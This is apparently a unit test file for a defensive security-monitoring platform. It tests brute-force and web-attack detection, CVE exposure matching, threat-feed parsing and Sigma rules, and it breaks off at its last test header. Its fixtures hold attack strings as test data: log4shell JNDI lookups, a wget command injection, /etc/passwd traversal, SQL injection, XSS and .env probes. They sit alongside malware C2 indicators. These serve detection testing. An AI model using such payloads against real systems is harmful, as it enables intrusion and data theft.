'use strict';
// Unit tests for the pieces that touch real-world data formats.
const assert = require('assert');
const { exposureFor, compareVersions, isInternal } = require('../src/engine/analysis');
const { normalizeAlert, normalizeLog, normalizeAsset, parseCsv } = require('../src/ingest/normalize');
const { normalizeNvd } = require('../src/intel/nvd');
const auth = require('../src/security/auth');
const { WebhookAdapter, CloudflareAdapter } = require('../src/enforce');
const seed = require('../src/seed');
const { parseNetset, parseSpamhaus, cidrRange, ThreatIntel } = require('../src/intel/threatintel');
const { parseNmapXml, looksLikeNmap } = require('../src/ingest/nmap');
const detect = require('../src/engine/detect');
const { softwareOf } = require('../src/intel/discover');
const { KevCatalog } = require('../src/intel/kev');

let n = 0;
const tests = [];
const test = (name, fn) => tests.push([name, fn]);

const log4j = seed.cves.find((c) => c.cve_id === 'CVE-2021-44228');
const httpd = seed.cves.find((c) => c.cve_id === 'CVE-2021-41773');
const host = (pkgs, services = []) => ({ installed_packages: pkgs, running_services: services });

const logAt = (raw, sec, host = '10.0.0.5') => ({ ...normalizeLog(raw, { host_ip: host }).log, logged_at: new Date(Date.UTC(2026, 9, 17, 10, 0, sec)).toISOString() });
const NOW = Date.UTC(2026, 9, 17, 10, 5, 0);

test('detect: SSH brute force needs the threshold inside the window', () => {
  const fail = (s) => logAt(`sshd[1]: Failed password for root from 203.0.113.9 port 1${s} ssh2`, s);
  assert.strictEqual(detect.evaluate([1, 2, 3, 4].map(fail), {}, { now: NOW }).length, 0);
  const hits = detect.evaluate([1, 2, 3, 4, 5].map(fail), {}, { now: NOW });
  assert.strictEqual(hits.length, 1);
  assert.strictEqual(hits[0].source_ip, '203.0.113.9');
  assert.strictEqual(hits[0].dest_ip, '10.0.0.5');
  // Spread over 50 minutes with a 10 minute window: no burst.
  const slow = [0, 600, 1200, 1800, 2400].map((s) => ({ ...fail(1), logged_at: new Date(NOW - 3000000 + s * 1000).toISOString() }));
  assert.strictEqual(detect.evaluate(slow, {}, { now: NOW }).length, 0);
});

test('detect: ids are stable so re-evaluation does not duplicate', () => {
  const lines = [1, 2, 3, 4, 5].map((s) => logAt(`sshd[1]: Invalid user test from 198.51.100.4 port 22${s}`, s));
  assert.strictEqual(detect.evaluate(lines, {}, { now: NOW })[0].alert_id, detect.evaluate(lines.slice().reverse(), {}, { now: NOW })[0].alert_id);
});

test('detect: web exploit classes and benign traffic', () => {
  const req = (uri, ua = 'Mozilla/5.0') => logAt(`198.51.100.9 - - [17/Oct/2026:10:00:01 +0000] "GET ${uri} HTTP/1.1" 404 0 "-" "${ua}"`, 1);
  const kind = (uri, ua) => (detect.classifyRequest(req(uri, ua)) || {}).id || null;
  assert.strictEqual(kind('/a', '${jndi:ldap://x/a}'), 'log4shell');
  assert.strictEqual(kind('/icons/.%2e/%2e%2e/etc/passwd'), 'traversal');
  assert.strictEqual(kind('/item?id=1%27%20OR%201=1'), 'sqli');
  assert.strictEqual(kind('/q?s=1+UNION+SELECT+password+FROM+users'), 'sqli');
  assert.strictEqual(kind('/ping?h=1;wget%20http://x/s'), 'cmdi');
  assert.strictEqual(kind('/.env'), 'secrets');
  assert.strictEqual(kind('/search?q=%3Cscript%3Ealert(1)%3C/script%3E'), 'xss');
  assert.strictEqual(kind('/products/union-select-shoes'), null);
  assert.strictEqual(kind('/docs/getting-started.html'), null);
  const scan = detect.evaluate(Array.from({ length: 20 }, (_, i) => req(`/p${i}`)), {}, { now: NOW });
  assert.ok(scan.some((a) => a.external_ref === 'aegis:web-scanner'));
});

test('detect: rules can be switched off', () => {
  const lines = [logAt('198.51.100.9 - - "GET /.env HTTP/1.1" 404 0', 1)];
  assert.strictEqual(detect.evaluate(lines, {}, { now: NOW }).length, 1);
  assert.strictEqual(detect.evaluate(lines, { detectDisabled: ['web-exploit'] }, { now: NOW }).length, 0);
  assert.strictEqual(detect.evaluate(lines, { detectEnabled: false }, { now: NOW }).length, 0);
});

test('CVE discovery maps host software to NVD CPE match strings', () => {
  const m = softwareOf({ running_services: [{ port: 22, service: 'OpenSSH 8.9p1' }, { port: 80, service: 'Apache httpd 2.4.49 (PHP 7.4.3)' }], installed_packages: ['log4j-core-2.14.1.jar', 'libssl3 3.0.13-0ubuntu3', 'left-pad 1.3.0'] }).map((s) => s.match);
  assert.deepStrictEqual(m, ['cpe:2.3:a:openbsd:openssh:8.9', 'cpe:2.3:a:apache:http_server:2.4.49', 'cpe:2.3:a:php:php:7.4.3', 'cpe:2.3:a:apache:log4j:2.14.1', 'cpe:2.3:a:openssl:openssl:3.0.13']);
});

test('KEV catalog parses the CISA feed shape', async () => {
  const body = { catalogVersion: '2026.10.16', dateReleased: '2026-10-16', count: 1, vulnerabilities: [{ cveID: 'CVE-2021-44228', vendorProject: 'Apache', product: 'Log4j2', vulnerabilityName: 'Apache Log4j2 RCE', dateAdded: '2021-12-10', dueDate: '2021-12-24', knownRansomwareCampaignUse: 'Known', requiredAction: 'Apply updates' }] };
  const kev = new KevCatalog({ fetchImpl: async () => ({ ok: true, json: async () => body }) });
  const k = await kev.lookup('cve-2021-44228');
  assert.strictEqual(k.ransomware, true);
  assert.strictEqual(kev.status().entries, 1);
  assert.strictEqual(await kev.lookup('CVE-2000-0001'), null);
  const down = new KevCatalog({ fetchImpl: async () => ({ ok: false, status: 503 }) });
  assert.strictEqual(await down.lookup('CVE-2021-44228'), null);
  assert.match(down.status().error, /503/);
});

test('CPE ranges: log4j 2.14.1 exposed, 2.17.1 and 2.12.2 not', () => {
  assert.ok(exposureFor(host(['log4j-core-2.14.1.jar']), log4j).exposed);
  assert.ok(!exposureFor(host(['log4j-core-2.17.1.jar']), log4j).exposed);
  assert.ok(!exposureFor(host(['log4j-core-2.12.2.jar']), log4j).exposed);
});

test('CPE exact version: httpd 2.4.49 exposed, 2.4.51 not', () => {
  assert.ok(exposureFor(host([], [{ port: 80, service: 'Apache httpd 2.4.49 (PHP 7.4.3)' }]), httpd).exposed);
  assert.ok(exposureFor(host(['httpd-2.4.49']), httpd).exposed);
  assert.ok(!exposureFor(host(['httpd-2.4.51']), httpd).exposed);
});

test('version compare', () => {
  assert.strictEqual(compareVersions('2.4.49', '2.4.5'), 1);
  assert.strictEqual(compareVersions('9.6p1', '9.6'), 1);
  assert.strictEqual(compareVersions('1.0', '1.0.0'), 0);
});

test('internal ranges', () => {
  for (const ip of ['10.1.2.3', '172.16.0.1', '192.168.1.1', '100.64.0.1', '127.0.0.1', 'fd00::1', 'fe80::1']) assert.ok(isInternal(ip), ip);
  for (const ip of ['8.8.8.8', '172.32.0.1', '2001:4860::8888']) assert.ok(!isInternal(ip), ip);
});

test('Suricata EVE alert normalises with stable id', () => {
  const eve = {
    timestamp: '2026-10-16T09:12:44.123456+0000', flow_id: 1234567, in_iface: 'eth0', event_type: 'alert',
    src_ip: '185.220.101.45', src_port: 51515, dest_ip: '10.0.4.15', dest_port: 8080, proto: 'TCP', app_proto: 'http',
    alert: { action: 'allowed', gid: 1, signature_id: 2034647, rev: 3, signature: 'ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)', category: 'Attempted Administrator Privilege Gain', severity: 1 },
    http: { hostname: 'shop.example', url: '/?x=${jndi:ldap://evil/a}', http_user_agent: 'curl/8', http_method: 'GET', protocol: 'HTTP/1.1' }
  };
  const a = normalizeAlert(eve).alert;
  assert.strictEqual(a.severity, 'CRITICAL');
  assert.strictEqual(a.external_ref, 'sid:2034647:3');
  assert.strictEqual(a.protocol, 'TCP/HTTP');
  assert.ok(a.raw_payload.includes('jndi:ldap'));
  assert.strictEqual(a.detected_at, '2026-10-16T09:12:44.123Z');
  assert.strictEqual(normalizeAlert(eve).alert.alert_id, a.alert_id);
  assert.ok(normalizeAlert({ event_type: 'flow' }).skip);
  assert.ok(normalizeAlert({ signature: 'Something odd', source_ip: 'nope', dest_ip: '10.0.0.1' }).error);
});

test('log lines: combined format and sshd', () => {
  const l = normalizeLog('203.0.113.9 - - [16/Oct/2026:09:12:44 +0000] "GET /cgi-bin/.%2e/etc/passwd HTTP/1.1" 200 1234', { host_ip: '10.0.4.88' }).log;
  assert.strictEqual(l.log_type, 'http_access');
  assert.strictEqual(l.client_ip, '203.0.113.9');
  assert.strictEqual(l.status_code, 200);
  const s = normalizeLog({ host_ip: '10.0.4.102', raw_entry: 'sshd[1]: Failed password for root from 45.95.147.236 port 4 ssh2' }).log;
  assert.strictEqual(s.log_type, 'auth_log');
  assert.strictEqual(s.client_ip, '45.95.147.236');
  assert.ok(normalizeLog('x', {}).error);
});

test('CSV asset import', () => {
  const rows = parseCsv('ip_address,hostname,criticality,services,installed_packages\r\n10.9.0.5,"web, edge",high,"443/nginx 1.22.1; 22/OpenSSH 9.6p1","log4j-core-2.14.1.jar;httpd-2.4.49"\n');
  assert.strictEqual(rows.length, 1);
  const a = normalizeAsset(rows[0]).asset;
  assert.strictEqual(a.hostname, 'web, edge');
  assert.strictEqual(a.criticality, 'HIGH');
  assert.deepStrictEqual(a.running_services, [{ port: 443, service: 'nginx 1.22.1' }, { port: 22, service: 'OpenSSH 9.6p1' }]);
  assert.ok(exposureFor(a, log4j).exposed);
  assert.ok(normalizeAsset({ ip_address: '10.0.0.1' }).error);
});

test('NVD record normalisation', () => {
  const rec = normalizeNvd({
    id: 'CVE-2024-3400', published: '2024-04-12T08:15:06.230', lastModified: '2024-04-20T01:00:00.000',
    cisaExploitAdd: '2024-04-12', cisaRequiredAction: 'Apply mitigations per vendor instructions.',
    descriptions: [{ lang: 'en', value: 'A command injection vulnerability in GlobalProtect. More text.' }],
    metrics: { cvssMetricV31: [{ type: 'Primary', cvssData: { version: '3.1', baseScore: 10, baseSeverity: 'CRITICAL', vectorString: 'CVSS:3.1/AV:N', attackVector: 'NETWORK', attackComplexity: 'LOW' } }] },
    configurations: [{ nodes: [{ cpeMatch: [{ vulnerable: true, criteria: 'cpe:2.3:o:paloaltonetworks:pan-os:*:*:*:*:*:*:*:*', versionStartIncluding: '11.1.0', versionEndExcluding: '11.1.2' }] }] }]
  });
  assert.strictEqual(rec.cvss_score, 10);
  assert.strictEqual(rec.kev, true);
  assert.strictEqual(rec.cpe_matches.length, 1);
  assert.strictEqual(rec.published, '2024-04-12T08:15:06.230Z');
  assert.ok(exposureFor(host([], [{ port: 443, service: 'PAN-OS 11.1.1' }]), rec).exposed);
});

test('passwords and sessions', () => {
  const h = auth.hashPassword('correct horse 1');
  assert.ok(auth.verifyPassword('correct horse 1', h));
  assert.ok(!auth.verifyPassword('correct horse 2', h));
  assert.ok(auth.passwordProblem('short1'));
  assert.ok(auth.passwordProblem('longbutnodigits'));
  assert.strictEqual(auth.passwordProblem('longenough9'), null);
  const tok = auth.signSession('s'.repeat(40), { id: 7, session_version: 3 });
  assert.deepStrictEqual((({ uid, v }) => ({ uid, v }))(auth.readSession('s'.repeat(40), tok)), { uid: 7, v: 3 });
  assert.strictEqual(auth.readSession('t'.repeat(40), tok), null);
  assert.strictEqual(auth.readSession('s'.repeat(40), tok.slice(0, -2) + 'xx'), null);
  const k = auth.generateApiKey();
  assert.ok(k.raw.startsWith('aeg_') && k.hash === auth.hashApiKey(k.raw) && k.raw.startsWith(k.prefix));
});

test('webhook adapter signs body and maps status', async () => {
  const crypto = require('crypto');
  let seen;
  const fetchImpl = async (url, opts) => { seen = opts; return { ok: true, status: 200, json: async () => ({ status: 'ok', id: 'r-1' }) }; };
  const w = new WebhookAdapter({ url: 'https://fw.example/hook', secret: 'hush', fetchImpl });
  const e = await w.apply({ rule_id: 'FW-1', action: 'BLOCK', target_ip: '203.0.113.9', reason: 'test' });
  assert.strictEqual(e.status, 'ENFORCED');
  assert.strictEqual(e.remote_id, 'r-1');
  const want = crypto.createHmac('sha256', 'hush').update(`${seen.headers['X-Aegis-Timestamp']}.${seen.body}`).digest('hex');
  assert.strictEqual(seen.headers['X-Aegis-Signature'], `sha256=${want}`);
  const down = new WebhookAdapter({ url: 'https://fw.example/hook', fetchImpl: async () => { throw new Error('ECONNREFUSED'); } });
  assert.strictEqual((await down.apply({ rule_id: 'FW-2', action: 'BLOCK', target_ip: '203.0.113.9' })).status, 'FAILED');
});

test('cloudflare adapter creates, verifies and removes', async () => {
  const calls = [];
  const fetchImpl = async (url, opts) => {
    calls.push(`${opts.method} ${url.split('/rules')[1] || '/'}`);
    if (opts.method === 'POST') return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1' } }) };
    if (opts.method === 'GET') return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1', mode: 'block', configuration: { value: '203.0.113.9' } } }) };
    return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1' } }) };
  };
  const cf = new CloudflareAdapter({ token: 't', zoneId: 'zone123456', fetchImpl });
  const rule = { rule_id: 'FW-1', action: 'BLOCK', target_ip: '203.0.113.9', reason: 'x' };
  rule.enforcement = await cf.apply(rule);
  assert.strictEqual(rule.enforcement.status, 'ENFORCED');
  assert.strictEqual((await cf.verify(rule)).status, 'ENFORCED');
  assert.strictEqual((await cf.remove(rule)).status, 'REMOVED');
  assert.strictEqual((await cf.apply({ ...rule, action: 'ISOLATE' })).status, 'RECORDED');
  assert.deepStrictEqual(calls, ['POST ', 'GET /cf1', 'DELETE /cf1'].map((s) => s.replace('POST ', 'POST /')));
});

test('blocklist parsers: CIDR maths, netset and Spamhaus NDJSON', () => {
  assert.deepStrictEqual(cidrRange('10.0.0.0/8'), { start: 167772160, end: 184549375 });
  assert.deepStrictEqual(cidrRange('192.168.1.77/24'), { start: 3232235776, end: 3232236031 });
  assert.strictEqual(cidrRange('not-an-ip/8'), null);
  assert.strictEqual(cidrRange('10.0.0.0/33'), null);
  const fh = parseNetset('# FireHOL\n1.2.3.0/24\n5.6.7.8 # single\n\nbad line\n');
  assert.strictEqual(fh.ranges.length, 1);
  assert.ok(fh.exact.has('5.6.7.8'));
  const sh = parseSpamhaus('{"cidr":"1.10.16.0/20","sblid":"SBL256894","rir":"apnic"}\n{"type":"metadata","timestamp":1}\nnot json\n');
  assert.strictEqual(sh.ranges.length, 1);
  assert.strictEqual(sh.ranges[0].label, '1.10.16.0/20 SBL256894');
});

test('threat intel offline mode refuses lookups', async () => {
  const ti = new ThreatIntel({ offline: true });
  assert.strictEqual(ti.available, false);
});

test('nmap XML becomes asset rows with services, packages and OS', () => {
  const xml = `<?xml version="1.0"?><nmaprun scanner="nmap" start="1760000000">
<host><status state="up"/><address addr="10.0.4.22" addrtype="ipv4"/><address addr="00:11:22:33:44:55" addrtype="mac" vendor="Dell"/>
<hostnames><hostname name="web-01.corp" type="PTR"/></hostnames>
<ports><port protocol="tcp" portid="80"><state state="open"/><service name="http" product="Apache httpd" version="2.4.49"><cpe>cpe:/a:apache:http_server:2.4.49</cpe></service></port>
<port protocol="tcp" portid="22"><state state="closed"/><service name="ssh"/></port></ports>
<os><osmatch name="Linux 5.4" accuracy="96"/></os></host>
<host><status state="down"/><address addr="10.0.4.23" addrtype="ipv4"/></host>
<host><status state="up"/><address addr="10.0.4.24" addrtype="ipv4"/></host>
<runstats><hosts up="2" down="1" total="3"/></runstats></nmaprun>`;
  assert.ok(looksLikeNmap(xml));
  assert.ok(!looksLikeNmap('ip_address,hostname\n10.0.0.1,a'));
  const rows = parseNmapXml(xml);
  assert.strictEqual(rows.length, 2);
  const [web, bare] = rows;
  assert.strictEqual(web.hostname, 'web-01.corp');
  assert.strictEqual(web.os_family, 'Linux');
  assert.deepStrictEqual(web.running_services, [{ port: 80, service: 'Apache httpd 2.4.49' }]);
  assert.ok(web.installed_packages.includes('Apache httpd 2.4.49'));
  assert.strictEqual(web.last_scanned, new Date(1760000000 * 1000).toISOString());
  assert.strictEqual(bare.hostname, 'host-10-0-4-24');
  assert.ok(exposureFor(web, httpd).exposed, 'scanned Apache 2.4.49 should match CVE-2021-41773');
});

// ---- Threat feeds, indicators, Sigma (all offline, inline fixtures) ---------------
const zlib = require('zlib');
const { parseCsvRow, unzip, FeedCache } = require('../src/intel/feeds');
const { classify, extractAll, fromPayload, registered } = require('../src/intel/indicator');
const { parseThreatFox, parseUrlhaus, parseBazaar, parseFeodo, AbuseCh } = require('../src/intel/abusech');
const { parseHashes, md5 } = require('../src/intel/misp');
const { compileRule, scanWith, toAlerts, webEvent, processEvent, parseBundle } = require('../src/engine/sigma');
const { createHub } = require('../src/intel/hub');

// A minimal zip writer (deflate) so the reader is tested against a real archive layout.
function makeZip(files) {
  const locals = []; const central = []; let off = 0;
  for (const [name, text] of files) {
    const raw = Buffer.from(text); const data = zlib.deflateRawSync(raw); const n = Buffer.from(name);
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(8, 8); lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(raw.length, 22); lh.writeUInt16LE(n.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(8, 10); ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(raw.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(off, 42);
    locals.push(lh, n, data); central.push(ch, n); off += 30 + n.length + data.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(files.length, 8); end.writeUInt16LE(files.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, end]);
}

const TF_CSV = `# ThreatFox export
"2026-10-16 08:00:00", "1601", "50.16.16.211:443", "ip:port", "botnet_cc", "win.qakbot", "QakBot", "QakBot", "None", "100", "None", "None", "qakbot,c2", "0", "abuse_ch"
"2026-10-16 09:00:00", "1602", "n.88mdc.org", "domain", "botnet_cc", "win.vidar", "None", "Vidar", "None", "100", "None", "None", "vidar", "0", "someone"
"2026-10-15 07:00:00", "1603", "http://evil.example/p.exe", "url", "payload_delivery", "win.remcos", "None", "Remcos", "None", "50", "None", "None", "None", "0", "r"`;

test('feeds: CSV rows with quotes and ", " separators', () => {
  assert.deepStrictEqual(parseCsvRow('"a", "b,c", "d ""q"""'), ['a', 'b,c', 'd "q"']);
  assert.deepStrictEqual(parseCsvRow('1,2,,4'), ['1', '2', '', '4']);
});

test('feeds: zip reader inflates entries', () => {
  const z = makeZip([['x/full.csv', TF_CSV], ['readme.txt', 'hello']]);
  const e = unzip(z);
  assert.deepStrictEqual(e.map((x) => x.name), ['x/full.csv', 'readme.txt']);
  assert.strictEqual(e[1].data().toString(), 'hello');
  assert.throws(() => unzip(Buffer.from('not a zip')), /not a zip/);
});

test('abuse.ch: ThreatFox (zipped), URLhaus, MalwareBazaar and Feodo parsers', () => {
  const tf = parseThreatFox(makeZip([['full.csv', TF_CSV]]));
  assert.strictEqual(tf.rows, 3);
  assert.strictEqual(tf.ip.get('50.16.16.211')[0].port, 443);
  assert.strictEqual(tf.domain.get('n.88mdc.org')[0].malware, 'Vidar');
  assert.ok(tf.urlHost.get('evil.example'));
  const uh = parseUrlhaus('# x\n"1","2026-10-16 10:00:00","http://182.121.159.82:36890/bin.sh","online","2026-10-16","malware_download","Mozi,elf","https://urlhaus.abuse.ch/url/1/","r"');
  assert.strictEqual(uh.rows, 1);
  assert.strictEqual(uh.host.get('182.121.159.82')[0].status, 'online');
  const mb = parseBazaar(`"2026-10-16 10:00:00", "${'a'.repeat(64)}", "${'b'.repeat(32)}", "${'c'.repeat(40)}", "r", "x.exe", "exe", "application/x-dosexec", "AgentTesla", "n/a", "n/a"`);
  assert.strictEqual(mb.hash.get('b'.repeat(32)).signature, 'AgentTesla');
  const fe = parseFeodo(JSON.stringify([{ ip_address: '50.16.16.211', port: 443, status: 'online', malware: 'QakBot', as_number: 14618 }]));
  assert.strictEqual(fe.ip.get('50.16.16.211').asn, 'AS14618');
});

test('indicators: classification, defanging and extraction', () => {
  assert.strictEqual(classify('hxxps://bad[.]top/x?a=1').type, 'url');
  assert.strictEqual(classify('8.8.8.8').type, 'ipv4');
  assert.strictEqual(classify('8.8.8.8:443').port, 443);
  assert.strictEqual(classify('AS15169').type, 'asn');
  assert.strictEqual(classify('44d88612fea8a8f36de82e1278abb02f').type, 'md5');
  assert.strictEqual(classify('a'.repeat(64)).type, 'sha256');
  assert.strictEqual(classify('Update.Shop-Mail.co.uk').value, 'update.shop-mail.co.uk');
  assert.strictEqual(classify('not an indicator'), null);
  assert.strictEqual(registered('a.b.shop-mail.co.uk'), 'shop-mail.co.uk');
  const got = extractAll('blocked 203.0.113[.]7 and evil-cdn[.]xyz, sha 44d88612fea8a8f36de82e1278abb02f').map((i) => i.type).sort();
  assert.deepStrictEqual(got, ['domain', 'ipv4', 'md5']);
});

test('indicators: pulled from captured payloads', () => {
  const p = fromPayload('GET /?x=${jndi:ldap://cb.attacker-dns.net:1389/a} HTTP/1.1\r\nHost: shop.acme-retail.com\r\n');
  assert.ok(p.some((i) => i.value === 'cb.attacker-dns.net' && /JNDI/i.test(i.where)), JSON.stringify(p));
});

test('MISP: hashed attribute index', () => {
  const m = parseHashes(`${md5('95.179.213.0')},ev-1\n${md5('95.179.213.0')},ev-2\nbad line\n`);
  assert.deepStrictEqual(m.get(md5('95.179.213.0')), ['ev-1', 'ev-2']);
});

const sigmaRule = (detection, logsource = { category: 'webserver' }, extra = {}) => compileRule({ title: 'T', id: 'r1', level: 'high', tags: ['attack.initial-access', 'attack.t1190', 'cve.2021-44228'], logsource, detection, ...extra }, 'rules/web/t.yml');
const webLine = (uri, ua = 'curl/8') => ({ log_type: 'http_access', host_ip: '10.0.0.5', client_ip: '198.51.100.7', logged_at: '2026-10-17T10:00:00Z', raw_entry: `198.51.100.7 - - [17/Oct/2026:10:00:00 +0000] "GET ${uri} HTTP/1.1" 200 12 "-" "${ua}"` });

test('sigma: modifiers, conditions and keywords', () => {
  const ev = webEvent(webLine('/a?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D'));
  const r = sigmaRule({ sel: { 'cs-uri-query|contains': ['${jndi:'] }, condition: 'sel' });
  assert.ok(r.match(ev), 'decoded URI matched');
  assert.strictEqual(r.technique, 'T1190');
  assert.strictEqual(r.cve, 'CVE-2021-44228');
  const all = sigmaRule({ sel: { 'cs-uri-query|contains|all': ['jndi', 'ldap'] }, condition: 'sel' });
  assert.ok(all.match(ev));
  const notR = sigmaRule({ a: { 'cs-uri-query|startswith': '/a' }, f: { 'cs-user-agent|endswith': 'curl/8' }, condition: 'a and not f' });
  assert.ok(!notR.match(ev));
  const oneOf = sigmaRule({ s1: { 'cs-uri-query|re': 'zzz' }, s2: { 'cs-method': 'GET' }, condition: '1 of s*' });
  assert.ok(oneOf.match(ev));
  const kw = sigmaRule({ keywords: ['base64 -d'], condition: 'keywords' }, { product: 'linux' });
  assert.strictEqual(kw.target, 'linux');
  assert.throws(() => sigmaRule({ sel: { x: 1 }, timeframe: '5m', condition: 'sel | count() > 5' }));
});

test('sigma: process events from sudo and auditd, and alert grouping', () => {
  const pe = processEvent({ log_type: 'auth_log', raw_entry: 'sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/x' });
  const rule = sigmaRule({ sel: { 'CommandLine|contains': 'base64 -d' }, condition: 'sel' }, { product: 'linux', category: 'process_creation' });
  const lines = [
    { log_type: 'auth_log', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:00Z', raw_entry: 'sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/x' },
    { log_type: 'system', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:01Z', raw_entry: 'type=EXECVE msg=audit(1760695201.1:9): argc=3 a0="base64" a1="-d" a2="/tmp/y"' },
    { log_type: 'auth_log', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:02Z', raw_entry: 'sudo: bob : COMMAND=/usr/bin/ls' }
  ];
  const m = scanWith([rule], lines);
  assert.strictEqual(m.length, 2);
  const a = toAlerts(m);
  assert.strictEqual(a.length, 1);
  assert.strictEqual(a[0].sensor, 'sigma');
  assert.match(a[0].external_ref, /^sigma:r1 CVE-2021-44228$/);
  assert.match(a[0].signature, /\(2 lines\)/);
  assert.strictEqual(scanWith([rule], lines, { minLevel: 'critical' }).length, 0);
  assert.strictEqual(scanWith([rule], lines, { disabled: ['r1'] }).length, 0);
});

test('sigma: rule bundle from a SigmaHQ-style archive', () => {
  const yml = 'title: Log4j probe\nid: 11111111-2222-3333-4444-555555555555\nlevel: critical\nlogsource:\n  category: webserver\ndetection:\n  sel:\n    cs-uri-query|contains: "${jndi:"\n  condition: sel\n';
  const win = 'title: Windows only\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  sel:\n    Image: x\n  condition: sel\n';
  const b = parseBundle(makeZip([['sigma_all_rules/version.txt', 'Label: r2026-04-01\n'], ['sigma_all_rules/rules/web/a.yml', yml], ['sigma_all_rules/rules/windows/b.yml', win]]));
  assert.strictEqual(b.version, 'r2026-04-01');
  assert.strictEqual(b.rules.length, 1);
  assert.ok(b.rules[0].match(webEvent(webLine('/?a=${jndi:ldap://x/a}'))));
});

test('approvals: confidence bands route actions', () => {
  const { routeFor } = require('../src/engine/approvals');
  assert.deepStrictEqual(routeFor(40, { approvalMode: 'auto' }), { route: 'auto', execute: true });
  const cfg = { approvalMode: 'confidence', approvalAutoAt: 90, approvalQuickAt: 85, approvalReviewAt: 70 };
  assert.deepStrictEqual(routeFor(95, cfg), { route: 'auto', execute: true });
  assert.deepStrictEqual(routeFor(87, cfg), { route: 'quick_review', execute: false });
  assert.deepStrictEqual(routeFor(75, cfg), { route: 'analyst_review', execute: false });
  assert.deepStrictEqual(routeFor(50, cfg), { route: 'escalate', execute: false });
  assert.strictEqual(routeFor(99, { approvalMode: 'manual' }).execute, false);
});

test('hunt: criteria validation and CIDR matching', () => {
  const { normalizeCriteria, ipMatcher, textMatcher, techId } = require('../src/engine/hunt');
  assert.throws(() => normalizeCriteria({}), /at least one/);
  assert.throws(() => normalizeCriteria({ text: 'x', window_hours: 0 }), /window_hours/);
  assert.throws(() => normalizeCriteria({ ip: '10.0.0.0/40' }), /CIDR/);
  assert.deepStrictEqual(normalizeCriteria({ technique: 't1110.003 brute force' }), { window_hours: 168, technique: 'T1110.003' });
  assert.deepStrictEqual(normalizeCriteria({ indicators: 'evil[.]top, 1.2.3[.]4' }).indicators.sort(), ['1.2.3.4', 'evil.top']);
  const m = ipMatcher('185.220.101.0/24');
  assert.ok(m('185.220.101.45') && !m('185.220.102.1') && !m('10.0.0.1'));
  assert.ok(ipMatcher('0.0.0.0/0')('203.0.113.9'));
  assert.ok(ipMatcher('10.0.0.0/8')('10.255.1.1'));
  assert.ok(textMatcher('/jndi:(ldap|rmi)/i')('${JNDI:LDAP://x}'));
  assert.strictEqual(techId('Exploit Public-Facing Application (T1190)'), 'T1190');
});

test('cases: kill-chain checklist follows the evidence', () => {
  const { playbookTasks } = require('../src/cases');
  const t = playbookTasks({ ip: '203.0.113.5', hosts: ['10.0.0.5', '10.0.0.6'], compromised: ['10.0.0.5'], techniques: ['T1110.001'] });
  assert.ok(t.some(([p, x]) => p === 'Containment' && x.includes('Isolate 10.0.0.5')));
  assert.ok(t.some(([, x]) => /Reset credentials/.test(x)));
  assert.ok(!t.some(([, x]) => /web shells/.test(x)));
});
test('intel hub: one lookup folds abuse.ch, RDAP and passive DNS into a verdict', async () => {
  const today = new Date(Date.now() - 5 * 86400000).toISOString();
  const routes = [
    [/threatfox.*\.abuse\.ch/, () => makeZip([['full.csv', TF_CSV]])],
    [/urlhaus.*\.abuse\.ch/, () => '# none\n'],
    [/data\.iana\.org\/rdap\/dns\.json/, () => JSON.stringify({ services: [[['org'], ['https://rdap.example-registry.test/']]] })],
    [/rdap\.example-registry\.test\/domain\//, () => JSON.stringify({ ldhName: '88mdc.org', events: [{ eventAction: 'registration', eventDate: today }], entities: [{ roles: ['registrar'], vcardArray: ['vcard', [['fn', {}, 'text', 'Test Registrar']]] }] })],
    [/api\.mnemonic\.no/, () => JSON.stringify({ count: 1, data: [{ query: 'n.88mdc.org', answer: '203.0.113.9', rrtype: 'a', times: 3, firstSeenTimestamp: Date.now() - 86400000, lastSeenTimestamp: Date.now() }] })],
    [/crt\.sh/, () => '[]'],
    [/botvrij\.eu/, () => { throw new Error('offline in test'); }]
  ];
  const fetchImpl = async (url) => {
    const r = routes.find(([re]) => re.test(url));
    if (!r) return { ok: false, status: 404, text: async () => '', json: async () => ({}), arrayBuffer: async () => new ArrayBuffer(0) };
    const body = r[1]();
    const buf = Buffer.isBuffer(body) ? body : Buffer.from(body);
    return { ok: true, status: 200, text: async () => buf.toString(), json: async () => JSON.parse(buf.toString()), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) };
  };
  const hub = createHub({ env: { ABUSECH_AUTH_KEY: 'test-key' }, fetchImpl, offline: false });
  const r = await hub.lookup('hxxp://n.88mdc[.]org/gate');
  assert.strictEqual(r.indicator.type, 'url');
  assert.strictEqual(r.verdict, 'malicious');
  assert.strictEqual(r.c2, true);
  assert.deepStrictEqual(r.families, ['Vidar']);
  assert.strictEqual(r.whois.registrar, 'Test Registrar');
  assert.ok(r.whois.fresh, 'five-day-old domain flagged as new');
  assert.strictEqual(r.pdns.records[0].answer, '203.0.113.9');
  assert.ok(r.sources_failed.some((f) => f.source === 'MISP OSINT'), 'a failing source is reported, not hidden');
  const clean = await hub.lookup('8.8.4.4');
  assert.notStrictEqual(clean.verdict, 'malicious');
  await assert.rejects(hub.lookup('???'), (e) => e.status === 400);
  const off = createHub({ env: {}, offline: true });
  assert.strictEqual((await off.lookup('example.org')).skipped, true);
});
test('intel hub: a payload on a shared platform flags the URL, not the platform', async () => {
